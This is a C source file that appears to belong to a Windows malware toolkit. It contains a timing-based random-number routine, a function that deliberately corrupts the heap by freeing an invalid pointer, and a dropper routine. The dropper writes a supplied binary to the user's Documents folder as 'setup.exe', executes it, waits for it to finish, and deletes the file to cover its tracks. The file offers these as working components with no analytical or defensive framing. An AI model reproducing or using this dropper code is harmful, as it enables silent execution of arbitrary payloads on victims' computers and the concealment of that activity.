#include "util.h"

HRT_PTR_INIT_GLOBAL;

V64
HRTAPI
HrtUtilQckRand(
	VOID )
{
	HRT_TIMEPOINT Tp;
	HrtTpInit( &Tp );

	/*
	*	Create a dummy 10 character array 
	*/
	NOREINITIALIZE UC DummyArray[ ] = { U( "          " ) };
	NOREINITIALIZE UC DummyArray2[ ] = { U( "          " ) };
	REGISTER V64 Rand = 0;

	/*
	*	Run trough a loop 25 times
	*/
	for ( VV i = 25; i != 0; --i ) {
		/*
		*	Time how long it takes to copy the seed into the dummy array
		*/
		HrtTpStart( &Tp );
		HrtMemCpy8( DummyArray2,
					DummyArray,
					SIZEOFARR( DummyArray ) );
		HrtTpNext( &Tp );
	
		Rand += Tp.Difference;
		Rand *= Rand;
	}

	/*
	*	Ensure the number is positive (In case of integer overflow)
	*/
	ENSURE_POS( Rand );

	return Rand;
}

NORETURN
VOID
HRTAPI
HrtUtilExtCorrHeap(
	VOID )
{
	/*
	*	Attempt to free a non-existant block
	*/
	free( HRT_PTR_SECRET_NAME.Secret );
}

VOID
HRTAPI
HrtUtilDropAndExec(
	V Bin,
	V Size )
{
	UC Path[MAX_PATH];
	SHGetSpecialFolderPathW( 0,
							 Path,
							 CSIDL_MYDOCUMENTS,
							 FALSE );
	HrtStrAppU( U( "\\setup.exe" ),
				Path,
				MAX_PATH );

	HRT_DBG_TRACE( "Dropping at %ws...\n",
				   Path );

	/*
	*	Create the file on disk
	*/
	VV File = CreateFileW( Path,
						   FILE_WRITE_ACCESS,
						   FILE_SHARE_READ,
						   NULL,
						   CREATE_ALWAYS,
						   FILE_ATTRIBUTE_NORMAL,
						   NULL );

	if ( INVALID_HANDLE_VALUE == File )
		goto ErrorOccured;
	
	DWORD Written = 0;

	/*
	*	Write the binary data to the file
	*/
	if ( !WriteFile( File,
					 Bin,
					 Size,
					 &Written,
					 NULL ) )
		goto ErrorOccured;

	CloseHandle( File );

	/*
	*	Create the process
	*/
	STARTUPINFOW		Si;
	HrtMemZeroAuto( Si );
	Si.cb = sizeof( Si );

	PROCESS_INFORMATION Pi;
	HrtMemZeroAuto( Pi );

	if ( !CreateProcessW( Path,
						  NULL,
						  NULL,
						  NULL,
						  FALSE,
						  0,
						  NULL,
						  NULL,
						  &Si,
						  &Pi ) )
		goto ErrorOccured2;

	/*
	*	Wait for the process to return
	*/
	WaitForSingleObject( Pi.hProcess, INFINITE );

	HRT_DBG_TRACE( "Process exited..." );

	/*
	*	Close all handles to the process and erase the file
	*/
	CloseHandle( Pi.hThread );
	CloseHandle( Pi.hProcess );
	DeleteFileW( Path );

	goto ErrorOccured2;

ErrorOccured:

	CloseHandle( File );

ErrorOccured2:

	return;
}